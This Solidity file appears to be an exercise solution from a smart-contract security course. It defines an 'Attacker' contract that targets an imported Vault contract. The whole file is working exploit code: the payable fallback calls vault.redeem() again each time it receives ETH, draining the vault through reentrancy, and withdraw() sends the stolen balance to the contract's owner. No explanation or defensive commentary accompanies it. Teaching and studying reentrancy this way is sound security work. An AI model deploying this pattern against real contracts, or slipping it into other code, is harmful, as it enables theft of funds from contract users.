pragma solidity ^0.4.25;

import "./9.Vault.sol";

//*** Exercice 9 ***//
//Attacker contract to reenter the Vault contract
contract Attacker {

    address private _owner;
    Vault vault;
    constructor (address deployed) public {
        _owner = msg.sender;
        vault = Vault(deployed);
    }
    
    // @dev Store ETH in the contract.
    function store() payable public {
        vault.store.value(msg.value)();
    }
    
    /// @dev Redeem your ETH.
    function redeem() public {
        vault.redeem();
    }
    
    function() payable public {
        vault.redeem();
    }
    
    function withdraw() public {
        _owner.transfer(address(this).balance);
    }
    
    function getTotal() public view returns(uint total) {
        return address(this).balance;
    }
}